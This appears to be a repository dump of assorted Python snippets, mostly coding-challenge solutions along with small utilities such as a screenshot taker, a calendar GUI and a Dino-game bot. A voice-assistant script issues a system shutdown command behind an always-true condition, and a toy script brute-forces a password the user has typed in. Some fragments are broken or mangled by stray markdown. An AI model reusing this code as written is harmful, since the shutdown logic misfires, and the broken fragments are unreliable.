# Solution by defining isPalindrome()
def isPalindrome(num):
    num = str(num)
    front = len(num) - 1
    rear = 0
    while rear <= front:
        if not num[front] == num[rear]:
            return False
        rear += 1
        front -= 1
    return True


n = int(input())
nums = list(map(int, input().split()))
print(
    "True"
    if all(x >= 0 for x in nums) and any(isPalindrome(x) for x in nums)
    else "False"
)

# More Concise Solution using string reversal
# Enter your code here. Read input from STDIN. Print output to STDOUT
def isPalindrome(num):
    num = str(num)
    return True if num == num[::-1] else False


n = int(input())
nums = list(map(int, input().split()))
print(
    "True"
    if all(x >= 0 for x in nums) and any(isPalindrome(x) for x in nums)
    else "False"
)

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the appendAndDelete function below.
def appendAndDelete(s, t, k):
    x = 0
    if s == t:
        return "Yes"
    if k > (len(s) + len(t)):
        return "Yes"
    for i in range(min(len(s), len(t))):
        if s[i] == t[i]:
            if x == 0 and i == min(len(s), len(t)) - 1:
                x = (len(s) - i) + (len(t) - i)
            continue
        else:
            x = (len(s) - i) + (len(t) - i)
            print(x)
            break
    if x <= k and x % 2 == k % 2:
        return "Yes"
    return "No"


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    s = input()

    t = input()

    k = int(input())

    result = appendAndDelete(s, t, k)

    fptr.write(result + "\n")

    fptr.close()

a = 5
b = 6
c = 7
# a = float(input('Enter first side: '))
# b = float(input('Enter second side: '))
# c = float(input('Enter third side: '))

# calculate the semi-perimeter
s = (a + b + c) / 2

# calculate the area
area = (s * (s - a) * (s - b) * (s - c)) ** 0.5
print("The area of the triangle is %0.2f" % area)

# Python Program to find the area of triangle when all three side-lengths are known!

a = 5
b = 6
c = 7

# Uncomment below to take inputs from the user
# a = float(input('Enter first side: '))
# b = float(input('Enter second side: '))
# c = float(input('Enter third side: '))

# calculate the semi-perimeter
s = (a + b + c) / 2

# calculate the area
area = (s * (s - a) * (s - b) * (s - c)) ** 0.5
print("The area of the triangle is %0.2f" % area)

num = int(input("enter 1-digit number:"))
f = num
sum = 0
while f > 0:
    a = f % 10
    f = int(f / 10)
    sum = sum + (a ** 3)
if sum == num:
    print("it is an armstrong number:", num)
else:
    print("it is not an armstrong number:", num)

fruits = ["apple", "banana", "cherry"]

cars = ["Ford", "BMW", "Volvo"]

fruits.extend(cars)

print(fruits)

# A function that returns the length of the value:
def myFunc(e):
    return len(e)


cars = ["Ford", "Mitsubishi", "BMW", "VW"]

cars.sort(key=myFunc)

print(cars)

def myFunc(e):
    return e["year"]


cars = [
    {"car": "Ford", "year": 2005},
    {"car": "Mitsubishi", "year": 2000},
    {"car": "BMW", "year": 2019},
    {"car": "VW", "year": 2011},
]

cars.sort(key=myFunc)

print(cars)

# A function that returns the length of the value:
def myFunc(e):
    return len(e)


cars = ["Ford", "Mitsubishi", "BMW", "VW"]

cars.sort(reverse=True, key=myFunc)

print(cars)

# def twoArraysNthElement(array1, array2, n):
#     return sorted(array1 + array2)[n]
# 70

# twoArraysNthElement = lambda a, b, n: sorted(a + b)[n]
# 46

a, b, n = eval(dir()[0])
return sorted(a + b)[n]
# 40

n, d = eval(dir()[0])
while n % d < 1:
    n /= d
return n

# def divideAsLongAsPossible(n, d):
#     while n % d == 0:
#         n /= d
#     return n

class Solution:
    def findContentChildren(self, g: List[int], s: List[int]) -> int:
        g = sorted(g)
        s = sorted(s)
        content = 0
        while s and g:
            if s[-1] >= g[-1]:
                s.pop()
                content += 1
            g.pop()
        return content

#!/bin/python3

import math
import os
import random
import re
import sys

if __name__ == "__main__":
    nm = input().split()

    n = int(nm[0])

    m = int(nm[1])

    arr = []

    for _ in range(n):
        arr.append(list(map(int, input().rstrip().split())))

    k = int(input())

    arr = sorted(arr, key=lambda x: x[k])
    for i in range(len(arr)):
        for j in range(len(arr[0])):
            print(arr[i][j], end=" ")
        print("")

import pyautogui
import time

i = 0
while i < 10:
    img = pyautogui.screenshot()
    # You have to specify the path that you wish to add screenshot
    img.save("D:\Screenshot\img" + str(i) + ".png")
    i = i + 1
    time.sleep(10)

from win32com.client import Dispatch
import speech_recognition as sr
import os
import time


def speak(audio):
    speak = Dispatch(("sapi.spvoice"))
    speak.speak(audio)


speak("Hello, I am your personal assistant")


def TakeCommand():
    r = sr.Recognizer()
    with sr.Microphone() as source:
        print("Listening...")
        r.pause_threshold = 1
        r.adjust_for_ambient_noise(source, duration=1)
        audio = r.listen(source)

        try:
            print("Recognizing...")
            Query = r.recognize_google(audio, language="en-in")

        except Exception as e:
            speak("Say that again please")
            return "None"
    return Query


while True:
    if __name__ == "__main__":
        Query = TakeCommand().lower()

    if "shut down" or "shutdown" in Query:
        speak("Do you want to shutdown your pc ")
        Query2 = TakeCommand().lower()

        if "yes" in Query2:
            speak("ok shutdowning...")
            time.sleep(3)
            os.system("shutdown /s /t 0")

        elif "no" in Query2:
            speak("Ok")

# average of sum of lists
m = [1, 43, 656, 8, 54, 908, 4, 5, 23, 78, 435, 89, 45, 476, 89]
n = [234, 56, 90, 675, 56, 786, 90, 564, 8, 657, 87, 64, 354, 2, 75]
q = [34, 76, 76, 564, 34, 32, 16, 67, 25, 98, 90, 345, 235, 64, 134, 76]


def avgSums():
    summingUp = sum(m) + sum(n) + sum(q)
    summed = summingUp / 3
    return summed


print(avgSums)

class BSTIterator:
    def __init__(self, root):
        self.stack = []
        while root:
            self.stack.append(root)
            root = root.left

    def has_next(self):
        return bool(self.stack)

    def next(self):
        node = self.stack.pop()
        tmp = node
        if tmp.right:
            tmp = tmp.right
            while tmp:
                self.stack.append(tmp)
                tmp = tmp.left
        return node.val

class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def bstFromPreorder(self, preorder):
        if not preorder:
            return None
        root = TreeNode(preorder[0])
        i = 1
        while i < len(preorder) and preorder[i] < root.val:
            i += 1
        root.left = self.bstFromPreorder(preorder[1:i])
        root.right = self.bstFromPreorder(preorder[i:])
        return root


preorder = [19, 4, 8, 11]
bst = Solution()
bst.bstFromPreorder(preorder)

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def convertBST(self, root: TreeNode) -> TreeNode:
        self.ans = 0

        def add(node):
            if not node:
                return
            add(node.right)
            self.ans += node.val
            node.val = self.ans
            add(node.left)

        add(root)
        return root

## Recursive Solution

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def inorderTraversal(self, root: TreeNode) -> List[int]:
        io = []

        if root == None:
            return []

        def inorder(x):
            if x.left != None:
                inorder(x.left)
            io.append(int(x.val))
            if x.right != None:
                inorder(x.right)

        inorder(root)
        return io


## Iterative Solution using Stack

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def inorderTraversal(self, root: TreeNode) -> List[int]:

        if root == None:
            return []
        stack = []
        io = []
        c = root

        while c != None or len(stack) != 0:
            while c != None:
                stack.append(c)
                c = c.left
            c = stack.pop()
            io.append(c.val)
            c = c.right
        return io

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None

## Recursive Solution


class Solution:
    def postorderTraversal(self, root: TreeNode) -> List[int]:
        if root == None:
            return []
        po = []

        def postorder(x):
            if not x:
                return
            postorder(x.left)
            postorder(x.right)
            po.append(x.val)

        postorder(root)
        return po

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None

## Recursive Solution


class Solution:
    def preorderTraversal(self, root: TreeNode) -> List[int]:
        if root == None:
            return []
        po = []

        def preorder(x):
            if x:
                po.append(x.val)
                preorder(x.left)
                preorder(x.right)

        preorder(root)
        return po


## Iterative Solution


class Solution:
    def preorderTraversal(self, root: TreeNode) -> List[int]:
        if root == None:
            return []
        stack = []
        po = []
        c = root

        while c != None or len(stack) != 0:
            while c != None:
                stack.append(c)
                po.append(c.val)
                c = c.left
            c = stack.pop()
            c = c.right
        return po

class Solution:
    def backspaceCompare(self, S: str, T: str) -> bool:
        def deleteBackSpace(X):
            stack = []
            for i in X:
                if not i == "#":
                    stack.append(i)
                elif len(stack) == 0:
                    continue
                else:
                    stack.pop()
            return stack

        return deleteBackSpace(S) == deleteBackSpace(T)
```

````py
Given two strings S and T, return if they are equal when both are typed into empty text editors. # means a backspace character.

Example 1:

Input: S = "ab#c", T = "ad#c"
Output: true
Explanation: Both S and T become "ac".```


```py


def backspaceCompare(S, T):
    return __helperFunc(S) == __helperFunc(T)


def __helperFunc(s):
    stack = []
    for ele in s:
        if ele != "#":
            stack.append(ele)
        else:
            if len(stack) > 0:
                stack.pop()
    return stack


print(backspaceCompare("ab#c", "ad#c"))

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def balanceBST(self, root: TreeNode) -> TreeNode:
        result = []

        def inorder(node):
            if node:
                if node.left != None:
                    inorder(node.left)
                result.append(int(node.val))
                if node.right != None:
                    inorder(node.right)

        def constructBalancedTree(arr):
            if not arr:
                return None
            mid = len(arr) // 2
            root = TreeNode(arr[mid])
            root.left = constructBalancedTree(arr[:mid])
            root.right = constructBalancedTree(arr[mid + 1 :])
            return root

        inorder(root)
        # result = [int(x.val) for x in result]
        return constructBalancedTree(result)

from collections import Counter


class Solution:
    # @param A : string
    # @return an integer
    def solve(self, A):
        stack = []
        c = Counter(A)
        for i in A:
            if i == "(":
                stack.append("(")
                continue
            if i == ")":
                if stack:
                    stack.pop()
        if not stack and c["("] == c[")"]:
            return 1
        else:
            return 0

# Given a binary tree, determine if it is height-balanced.
#
# For this problem, a height-balanced binary tree is defined as:
#
# a binary tree in which the left and right subtrees of every node differ in height by no more than 1.
#
# Example 1:
#
# Given the following tree [3,9,20,null,null,15,7]:
#
#     3
#    / \
#   9  20
#     /  \
#    15   7
# Return true.
#
# Example 2:
#
# Given the following tree [1,2,2,3,3,null,null,4,4]:
#
#        1
#       / \
#      2   2
#     / \
#    3   3
#   / \
#  4   4
# Return false.


class TreeNode:
    def __init__(self, val):
        self.val = val
        self.left = None
        self.right = None


class Solution:
    def isBalanced(self, root):
        def helper(root):
            if not root:
                return (True, 0)

            leftB, leftH = helper(root.left)
            rightB, rightH = helper(root.right)

            return (
                leftB and rightB and abs(leftH - rightH) <= 1,
                max(leftH, rightH) + 1,
            )

        return helper(root)[0]


if __name__ == "__main__":
    root = TreeNode(1)
    root.left = TreeNode(2)
    root.right = TreeNode(2)
    root.left.left = TreeNode(3)
    root.right.right = TreeNode(3)
    root.left.left.left = TreeNode(4)
    root.right.right.right = TreeNode(4)
    print(Solution().isBalanced(root))

from matplotlib import pyplot

x = []
y = []

a = int(input("Enter the number of values that you want to represent in Bar graph : "))
print("X-axis")
for i in range(a):
    p = int(input(f"Enter the {i+1} value on X axis : "))
    x.append(p)
print("Y-axis")
for j in range(a):
    q = int(input(f"Enter the {j+1} value on Y axis : "))
    y.append(q)

# To set the name of the window
fig = pyplot.gcf()
fig.canvas.set_window_title("BAR GRAPH")

# To set title of the window
pyplot.title("Bar Graph representation")

pyplot.bar(x, y)
pyplot.show()

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the beautifulBinaryString function below.
def beautifulBinaryString(b):
    return (len(b) - len(b.replace("010", ""))) // 3


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    n = int(input())

    b = input()

    result = beautifulBinaryString(b)

    fptr.write(str(result) + "\n")

    fptr.close()

#!/bin/python3

import math
import os
import random
import re
import sys
from collections import Counter

# Complete the beautifulPairs function below.
def beautifulPairs(A, B):
    bp = sum((Counter(A) - Counter(B)).values())
    return len(A) - bp + 1 if bp else len(A) - 1


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    n = int(input())

    A = list(map(int, input().rstrip().split()))

    B = list(map(int, input().rstrip().split()))

    result = beautifulPairs(A, B)

    fptr.write(str(result) + "\n")

    fptr.close()

import requests
from bs4 import BeautifulSoup
import csv

page = requests.get("https://www.census.gov/programs-surveys/popest.html")
print(page.status_code)
soup = BeautifulSoup(page.text, "html.parser")
link_set = set()
for link in soup.find_all("a"):
    web_links = link.get("href")
    print(web_links)
    link_set.add(web_links)

csvfile = open("code_python.csv", "w+", newline="")
writer = csv.writer(csvfile)
writer.writerow(["Links"])
for link in link_set:
    writer.writerow([link])
csvfile.close()

def isBeautifulString(inputString):
    counter = [inputString.count(i) for i in string.ascii_lowercase]
    return counter[::-1] == sorted(counter)

from __future__ import print_function


def printDist(dist, V):
    print("\nVertex Distance")
    for i in range(V):
        if dist[i] != float("inf"):
            print(i, "\t", int(dist[i]), end="\t")
        else:
            print(i, "\t", "INF", end="\t")
        print()


def BellmanFord(graph, V, E, src):
    mdist = [float("inf") for i in range(V)]
    mdist[src] = 0.0

    for i in range(V - 1):
        for j in range(V):
            u = graph[j]["src"]
            v = graph[j]["dst"]
            w = graph[j]["weight"]

            if mdist[u] != float("inf") and mdist[u] + w < mdist[v]:
                mdist[v] = mdist[u] + w
    for j in range(V):
        u = graph[j]["src"]
        v = graph[j]["dst"]
        w = graph[j]["weight"]

        if mdist[u] != float("inf") and mdist[u] + w < mdist[v]:
            print("Negative cycle found. Solution not possible.")
            return

    printDist(mdist, V)


# MAIN
V = int(input("Enter number of vertices: "))
E = int(input("Enter number of edges: "))

graph = [dict() for j in range(E)]

for i in range(V):
    graph[i][i] = 0.0

for i in range(E):
    print("\nEdge ", i + 1)
    src = int(input("Enter source:"))
    dst = int(input("Enter destination:"))
    weight = float(input("Enter weight:"))
    graph[i] = {"src": src, "dst": dst, "weight": weight}

gsrc = int(input("\nEnter shortest path source:"))
BellmanFord(graph, V, E, gsrc)

class Solution:
    def maxProfit(self, prices: List[int]) -> int:
        profit = 0
        for i in range(0, len(prices) - 1):
            if prices[i + 1] > prices[i]:
                profit += prices[i + 1] - prices[i]
        return profit

def maxProfit(prices):
    i = 0
    max_profit = 0
    while i < len(prices) - 1:
        while i < len(prices) - 1 and prices[i] >= prices[i + 1]:
            i += 1
        min_pri = prices[i]
        while i < len(prices) - 1 and prices[i] <= prices[i + 1]:
            i += 1
        max_pri = prices[i]
        max_profit += max_pri - min_pri
    return max_profit


print(maxProfit([1, 2, 3, 4, 5, 6]))

def pascal_triangle(lineNumber):
    list1 = list()
    list1.append([1])
    i = 1
    while i <= lineNumber:
        j = 1
        l = []
        l.append(1)
        while j < i:
            l.append(list1[i - 1][j] + list1[i - 1][j - 1])
            j = j + 1
        l.append(1)
        list1.append(l)
        i = i + 1
    return list1


def binomial_coef(n, k):
    pascalTriangle = pascal_triangle(n)
    return pascalTriangle[n][k - 1]

def Binary_Search(Test_arr, low, high, k):
    if high >= low:
        Mid = (low + high) // 2
        if Test_arr[Mid] < k:
            return Binary_Search(Test_arr, Mid + 1, high, k)
        elif Test_arr[Mid] > k:
            return Binary_Search(Test_arr, low, Mid - 1, k)
        else:
            return Mid
    else:
        return low


def Insertion_Sort(Test_arr):
    for i in range(1, len(Test_arr)):
        val = Test_arr[i]
        j = Binary_Search(Test_arr[:i], 0, len(Test_arr[:i]) - 1, val)
        Test_arr.pop(i)
        Test_arr.insert(j, val)
    return Test_arr


if __name__ == "__main__":
    Test_list = input("Enter the list of Numbers: ").split()
    Test_list = [int(i) for i in Test_list]
    print(f"Binary Insertion Sort: {Insertion_Sort(Test_list)}")

# Binary search tree construction
#       5
#      / \
#    4    7
#         / \
#       6    8


class TreeNode:
    def __init__(self, val):
        self.val = val
        self.left = None
        self.right = None


class Solution:
    def insertIn(self, root, num):
        currNode = root

        while True:
            if num > currNode.val:
                if currNode.right is None:
                    currNode.right = TreeNode(num)
                    break
                else:
                    currNode = currNode.right

            else:
                if currNode.left is None:
                    currNode.left = TreeNode(num)
                    break
                else:
                    currNode = currNode.left
        return root

    def dfs(self, root):
        if not root:
            return
        print(root.val)
        self.dfs(root.left)
        self.dfs(root.right)


if __name__ == "__main__":
    node = TreeNode(5)
    node.left = TreeNode(4)
    node.right = TreeNode(7)
    node.right.left = TreeNode(6)
    node.right.right = TreeNode(8)
    curr = node
    newnode = Solution().insertIn(curr, 2)
    Solution().dfs(node)

# Given a binary tree, return the inorder traversal of its nodes' values.
#
# Example:
#
# Input: [1,null,2,3]
#    1
#     \
#      2
#     /
#    3
#
# Output: [1,3,2]
# Definition for a binary tree node.


class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def inorderTraversal(self, root):

        stack = []
        res = []

        while stack or root:
            while root:
                stack.append(root)
                root = root.left

            root = stack.pop()

            res.append(root.val)

            root = root.right

        return res

# Given a binary tree, return the level order traversal of its nodes
# ' values. (ie, from left to right, level by level).
#
# For example:
# Given binary tree [3,9,20,null,null,15,7],
#
#     3
#    / \
#   9  20
#     /  \
#    15   7
# return its level order traversal as:
#
# [
#   [3],
#   [9,20],
#   [15,7]
# ]
# Definition for a binary tree node.

import collections


class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def levelOrder(self, root):
        if not root:
            return []

        res = []
        queue = collections.deque()
        queue.append(root)

        while len(queue):
            num = len(queue)
            arr = []
            while num > 0:
                node = queue.popleft()
                arr.append(node.val)
                if node.left:
                    queue.append(node.left)
                if node.right:
                    queue.append(node.right)
                num -= 1
            res.append(arr)

        return res

# Given a binary tree, return all root-to-leaf paths.
#
# Note: A leaf is a node with no children.
#
# Example:
#
# Input:
#
#    1
#  /   \
# 2     3
#  \
#   5
#
# Output: ["1->2->5", "1->3"]
#
# Explanation: All root-to-leaf paths are: 1->2->5, 1->3


class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def binaryTreePaths(self, root):
        res = []
        path = ""

        def helper(node, path):
            if not node:
                return
            path += str(node.val) + "->"
            if not node.left and not node.right:
                res.append(path[:-2])
                return

            helper(node.left, path)
            helper(node.right, path)

        helper(root, path)
        return res

import math


class Solution:
    def rangeBitwiseAnd(self, m: int, n: int) -> int:
        ans = m
        if not m == 0:
            x = math.log2(m)
            x = int(x) + 1
            x = 2 ** x
        else:
            return 0
        if n >= x:
            return 0
        for i in range(m + 1, n + 1):
            ans = ans & i
        return ans

from PIL import Image


def blackAndWhite():
    img = Image.open(
        r"C:\Users\pc\Desktop\Hacking-Scripts\Python\Black and White\Images\img.jpg"
    )
    BlackAndwhite = img.convert("L")
    BlackAndwhite.save(
        r"C:\Users\pc\Desktop\Hacking-Scripts\Python\Black and White\Images\bw_img.jpg"
    )


if __name__ == "__main__":
    blackAndWhite()

def boxBlur(image):
    def pixels(matrix, i, j):
        summ = 0
        for x in range(i - 1, i + 2):
            for y in range(j - 1, j + 2):
                summ += matrix[x][y]
                mean = summ // 9
        return mean

    output = []
    row = len(image)
    col = len(image[0])
    for i in range(1, row - 1):
        arr = []
        for j in range(1, col - 1):
            arr.append(pixels(image, i, j))
        output.append(arr)
    return output

def chessBoardCellColor(cell1, cell2):
    cell1_elm = ord(cell1[0]) + int(cell1[1])
    cell2_elm = ord(cell2[0]) + int(cell2[1])
    return (cell1_elm + cell2_elm) % 2 == 0

def addBorder(picture):
    new_pic = []
    border = ""
    pic_len = len(picture)
    for i in range(0, len(picture[0]) + 2):
        border += "*"
    new_pic.append(border)
    for i in range(0, pic_len):
        new_pic.append("*" + picture[i] + "*")
    new_pic.append(border)
    return new_pic

# importing random
from random import *

# taking input from user
user_pass = input("Enter your password")

# storing alphabet letter to use thm to crack password
password = [
    "a",
    "b",
    "c",
    "d",
    "e",
    "f",
    "g",
    "h",
    "i",
    "j",
    "k",
    "l",
    "m",
    "n",
    "o",
    "p",
    "q",
    "r",
    "s",
    "t",
    "u",
    "v",
    "w",
    "x",
    "y",
    "z",
]

# initializing an empty string
guess = ""

# using while loop to generate many passwords untill one of
# them does not matches user_pass
while guess != user_pass:
    guess = ""
    # generating random passwords using for loop
    for letter in range(len(user_pass)):
        guess_letter = password[randint(0, 25)]
        guess = str(guess_letter) + str(guess)
    # printing guessed passwords
    print(guess)

# printing the matched password
print("Your password is", guess)

def bubblesort(list):

    # Swap the elements to arrange in order
    for iter_num in range(len(list) - 1, 0, -1):
        for idx in range(iter_num):
            if list[idx] > list[idx + 1]:
                temp = list[idx]
                list[idx] = list[idx + 1]
                list[idx + 1] = temp


list = [19, 2, 31, 45, 6, 11, 121, 27]
bubblesort(list)
print(list)

# Create UI
display = []
buttons = []
for n in range(10):
    # A button is a function called when user clicks on it
    buttons.append(lambda: display.append(n))

# Click on button 3
btn = buttons[3]
btn()
print(display)

def maxProfit(prices):
    i = 0
    max_profit = 0
    while i < len(prices) - 1:
        while i < len(prices) - 1 and prices[i] >= prices[i + 1]:
            i += 1
        min_pri = prices[i]
        while i < len(prices) - 1 and prices[i] <= prices[i + 1]:
            i += 1
        max_pri = prices[i]
        max_profit += max_pri - min_pri
    return max_profit


print(maxProfit([1, 2, 3, 4, 5, 6]))
````

```pySome people are standing in a row in a park. There are trees between them which cannot be moved.
Your task is to rearrange the people by their heights in a non-descending order without moving the trees.
People can be very tall!

Example:
- For a = [-1, 150, 190, 170, -1, -1, 160, 180], the output should be sortByHeight(a) = [-1, 150, 160, 170, -1, -1, 180, 190]."""


def sortByHeight(a):
    # Step 1: We begin by creating a counter, starting from 0, that will be used in the subsequent for-loop.
    j = 0
    # Step 2: We also create a new array, called "a_sort", where we sort (in ascending order) all elements of the given array "a"
    # that are not "trees" (i.e. do not have a value of -1).
    a_sort = sorted([i for i in a if i != -1])
    # Step 3: By implementing a for-loop, we investigate all elements of the given array "a" (NOT a_sort!) and check:
    # if the element i in array "a" is equal to -1, the for-loop continues. Otherwise, the element i in array "a" should be
    # the same as element j in array "a_sort" (starting from 0 index, as defined in step 1).
    # You can think of it as working through elements of array "a", disregarding the "trees" (-1s) and sorting the rest
    # of the elements in ascending order (as in a_sort).
    for i in range(len(a)):
        if a[i] == -1:
            pass
        else:
            a[i] = a_sort[j]
            j += 1
    # Step 4: The final step is the return of the modified array "a".
    return a

# Percentage Calculator
def percentToOrig():
    whatPercent = float(input("What Percent : "))
    ofWhat = float(input("Of What Percent : "))
    orignal = whatPercent / 100 * ofWhat
    print(orignal)


print(percentToOrig())

def res(R1, R2):
    sum = R1 + R2
    if option == "series":
        return sum
    else:
        return (R1 * R2) / (R1 + R2)


Resistance1 = int(input("Enter R1 : "))
Resistance2 = int(input("Enter R2 : "))
option = str(input("Enter series or parallel :"))
print("\n")
R = res(Resistance1, Resistance2)
print("The total resistance is", R)

from tkinter import *
import calendar

root = Tk()
# root.geometry("400x300")
root.title("Calendar")

# Function


def text():
    month_int = int(month.get())
    year_int = int(year.get())
    cal = calendar.month(year_int, month_int)
    textfield.delete(0.0, END)
    textfield.insert(INSERT, cal)


# Creating Labels
label1 = Label(root, text="Month:")
label1.grid(row=0, column=0)

label2 = Label(root, text="Year:")
label2.grid(row=0, column=1)

# Creating spinbox
month = Spinbox(root, from_=1, to=12, width=8)
month.grid(row=1, column=0, padx=5)

year = Spinbox(root, from_=2000, to=2100, width=10)
year.grid(row=1, column=1, padx=10)

# Creating Button
button = Button(root, text="Go", command=text)
button.grid(row=1, column=2, padx=10)

# Creating Textfield
textfield = Text(root, width=25, height=10, fg="red")
textfield.grid(row=2, columnspan=2)


root.mainloop()

def solve():
    t = int(input())
    for _ in range(t):
        n = int(input())
        A = list(map(int, input().split()))
        count = 0
        small = float("inf")
        for each in A:
            if each < small:
                small = each
                count += 1
        print(count)


if __name__ == "__main__":
    solve()

def arrayChange(inputArray):
    first = inputArray[0]
    count = 0
    for i in inputArray[1:]:
        if i <= first:
            count += first - i + 1
            first = first + 1
        else:
            first = i
    return count
```

```pyGiven two strings, find the number of common characters between them.

Example:
For s1 = "aabcc" and s2 = "adcaa", the output should be commonCharacterCount(s1, s2) = 3.
Strings have 3 common characters - 2 "a"s and 1 "c"."""


def commonCharacterCount(s1, s2):
    # Step 1: We create two lists, namely s1_l and s2_l, where we store the characters of strings s1 and s2 respectively.
    s1_l = list(s1)
    s2_l = list(s2)
    # Step 2: We also create an empty list, where we are going to store all common characters.
    common = []
    # Step 3: Using a for-loop, we investigate the list of the first string, element by element.
    for i in s1_l:
        # Step 4: If the i-th element from the list of the first string is also present in the list of the second string,
        # we append it to the common array. BE CAREFUL: We must implement the s2_l.remove(i) to avoid double-counting.
        # I checked myself and I can assure you that you can substitute s1_l for s2_l and vice versa (in the for-loop,
        # the if statement and the double-counting term), without affecting the validity of your code.
        if i in s2_l:
            common.append(i)
            s2_l.remove(i)
    # Step 5: Finally, we return the length of the common list, to find the number of the common characters
    # between the two strings given.
    return len(common)

# Enter your code here. Read input from STDIN. Print output to STDOUT
A = set(map(int, input().split()))
n = int(input())
for _ in range(n):
    x = set(map(int, input().split()))
    if A >= x:
        continue
    else:
        print("False")
        exit()
print("True")

# Enter your code here. Read input from STDIN. Print output to STDOUT
t = int(input())
for _ in range(t):
    na = int(input())
    a = set(map(int, input().split()))
    nb = int(input())
    b = set(map(int, input().split()))
    print("True" if a <= b else "False")

from collections import Counter


class Solution:
    def count(self, d1, d2):
        s = 0
        for i in "abcdefghijklmnopqrstuvwxyz":
            s += d1[i] - d2[i]
            if s < 0:
                return False
        return True

    def checkIfCanBreak(self, s1: str, s2: str) -> bool:
        d1 = Counter(s1)
        d2 = Counter(s2)
        return self.count(d1, d2) | self.count(d2, d1)

# Given an array nums sorted in non-decreasing order, and a number target,
# return True if and only if target is a majority element.
#
# A majority element is an element that appears more than N/2 times in an array of length N.
#
# Example 1:
#
# Input: nums = [2,4,5,5,5,5,5,6,6], target = 5
# Output: true
# Explanation:
# The value 5 appears 5 times and the length of the array is 9.
# Thus, 5 is a majority element because 5 > 9/2 is true.
# Example 2:
#
# Input: nums = [10,100,101,101], target = 101
# Output: false
# Explanation:
# The value 101 appears 2 times and the length of the array is 4.
# Thus, 101 is not a majority element because 2 > 4/2 is false.

import collections


class Solution:
    def isMajorityElement(self, nums, target):
        dict = collections.Counter(nums)
        if len(nums) == 1:
            return nums[0] == target

        k = nums[len(nums) // 2]
        if dict[k] > len(nums) // 2:
            return True

        return False

for _ in range(int(input())):
    n, k = map(int, input().split())
    inp = list(map(int, input().split()))
    if n == 1:
        print(int((inp[0] / k) + 1))
        continue
    total = 0
    day = 0
    dayFound = 0
    for i in range(n):
        day += 1
        if inp[i] + total < k:
            print(int(day))
            dayFound = 1
            break
        total = (inp[i] + total) - k
    if not dayFound:
        day += total / k
        print(int(day + 1))

for T in range(int(input())):
    N = int(input())
    m = 0
    for i in range(N):
        S, P, V = map(int, input().split())
        m = max(m, (P // (S + 1)) * V)
    print(m)

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the chocolateFeast function below.
def chocolateFeast(n, c, m):
    choc = n // c
    w = choc
    while True:
        if w >= m:
            choc += w // m
            w = (w // m) + (w % m)
            continue
        return choc


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    t = int(input())

    for t_itr in range(t):
        ncm = input().split()

        n = int(ncm[0])

        c = int(ncm[1])

        m = int(ncm[2])

        result = chocolateFeast(n, c, m)

        fptr.write(str(result) + "\n")

    fptr.close()

import pyautogui
from PIL import Image, ImageGrab
import time


def autoMate(key):
    pyautogui.keyDown(key)
    return


def collision(data):
    # Check collision for birds
    for i in range(170, 210):
        for j in range(209, 374):
            if data[i, j] < 100:
                autoMate("down")
                return
    # Check collision for cactus
    for i in range(237, 275):
        for j in range(376, 440):
            if data[i, j] < 100:
                autoMate("up")
                return
    return


if __name__ == "__main__":
    print("The game is starting in 2 seconds...")
    time.sleep(2)
    while True:
        image = ImageGrab.grab().convert("L")
        data = image.load()
        collision(data)

import pyautogui  # pip install pyautogui
from PIL import Image, ImageGrab  # pip install pillow

# from numpy import asarray
import time


def hit(key):
    pyautogui.press(key)
    return


def isCollide(data):

    # for cactus
    for i in range(329, 425):
        for j in range(550, 650):
            if data[i, j] < 100:
                hit("up")
                return

    # Draw the rectangle for birds
    # for i in range(310, 425):
    #     for j in range(390, 550):
    #         if data[i, j] < 100:
    #             hit("down")
    #             return

    # return


if __name__ == "__main__":
    print("Hey.. Dino game about to start in 3 seconds")
    time.sleep(2)
    # hit('up')

    while True:
        image = ImageGrab.grab().convert("L")
        data = image.load()
        isCollide(data)

        # print(aarray(image))

        # Draw the rectangle for cactus
        # for i in range(315, 425):
        #     for j in range(550, 650):
        #         data[i, j] = 0

        # # # # # Draw the rectangle for birds
        # for i in range(310, 425):
        #     for j in range(390, 550):
        #         data[i, j] = 171

        # image.show()
        # break

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the circularArrayRotation function below.
def circularArrayRotation(a, k, queries):
    print(a)
    print(k)
    print(queries)
    x = len(a)
    A = [0] * x
    for i in range(0, x):
        A[(i + k) % x] = a[i]
    a = []
    for i in range(len(queries)):
        a.append(A[queries[i]])
    return a


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    nkq = input().split()

    n = int(nkq[0])

    k = int(nkq[1])

    q = int(nkq[2])

    a = list(map(int, input().rstrip().split()))

    queries = []

    for _ in range(q):
        queries_item = int(input())
        queries.append(queries_item)

    result = circularArrayRotation(a, k, queries)

    fptr.write("\n".join(map(str, result)))
    fptr.write("\n")

    fptr.close()

class Solution:
    def climbStairs(self, n: int) -> int:
        def climb(i, n, memo):
            if i > n:
                return 0
            if i == n:
                return 1
            if memo[i] > 0:
                return memo[i]
            memo[i] = climb(i + 1, n, memo) + climb(i + 2, n, memo)
            return memo[i]

        memo = [0 for _ in range(n + 2)]
        return climb(0, n, memo)

